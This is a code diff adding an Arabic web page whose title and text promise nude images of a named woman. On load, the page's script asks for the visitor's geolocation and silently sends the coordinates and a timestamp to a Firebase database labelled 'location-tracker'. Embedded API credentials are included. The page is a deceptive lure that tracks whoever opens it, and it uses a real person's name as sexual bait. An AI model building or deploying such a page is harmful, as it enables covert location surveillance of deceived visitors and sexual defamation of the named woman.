@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>نودز مريم هاني </title>
+</head>
+<body>
+  <h2>جاري تحميل النودز ...</h2>
+
+  <!-- Firebase SDKs -->
+  <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database-compat.js"></script>
+
+  <script>
+    // إعدادات Firebase الخاصة بك
+    const firebaseConfig = {
+      apiKey: "AIzaSyBDt2w7BrXS1s5B7M16l5S4cNY4RtsIVA4",
+      authDomain: "location-tracker-15c08.firebaseapp.com",
+      projectId: "location-tracker-15c08",
+      storageBucket: "location-tracker-15c08.firebasestorage.app",
+      messagingSenderId: "146140731296",
+      appId: "1:146140731296:web:9fcd912a853e867a8ab6c5",
+      measurementId: "G-2QN76KC2YB",
+      databaseURL: "https://location-tracker-15c08-default-rtdb.firebaseio.com" // مهم جداً!
+    };
+
+    // تهيئة Firebase
+    firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
+
+    function sendLocation(latitude, longitude) {
+      const timestamp = new Date().toISOString();
+
+      // إرسال البيانات إلى Realtime Database
+      const locationRef = database.ref("locations").push();
+      locationRef.set({
+        latitude: latitude,
+        longitude: longitude,
+        timestamp: timestamp
+      })
+      .then(() => {
+        alert("تم إستقبال طلبك بنجاح ");
+      })
+      .catch((error) => {
+        console.error("خطأ في الإرسال:", error);
+      });
+    }
+
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            sendLocation(lat, lon);
+          },
+          (error) => {
+            alert("لم يتم السماح بالوصول للموقع أو حصل خطأ");
+          }
+        );
+      } else {
+        alert("المتصفح لا يدعم تحديد الموقع");
+      }
+    }
+
+    // أول ما الصفحة تفتح، شغل تحديد الموقع
+    getLocation();
+  </script>
+</body>
+</html>
